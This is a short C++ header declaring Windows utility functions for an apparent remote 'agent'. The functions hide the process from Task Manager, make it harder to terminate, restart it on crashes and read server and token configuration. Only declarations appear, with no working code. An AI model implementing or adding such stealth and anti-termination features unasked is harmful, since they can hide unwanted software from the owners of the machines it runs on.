#pragma once

#include <string>

#include <windows.h>

namespace agent {

class WinUtils {
public:
    // Hide process from casual Task Manager inspection
    static void hide_process();

    // Protect process — restrict access to make it harder to terminate
    static void protect_process();

    // Install crash handler that restarts the process on unhandled exceptions
    static void install_crash_handler();

    // Get hostname
    static std::string get_hostname();

    // Read config from file or registry
    static bool read_config_file(const std::string& path, std::string& server_host,
                                  uint16_t& server_port, std::string& agent_id,
                                  std::string& agent_token);

    // Create mutex to prevent multiple instances
    static HANDLE create_single_instance_mutex(const std::string& name);
};

} // namespace agent
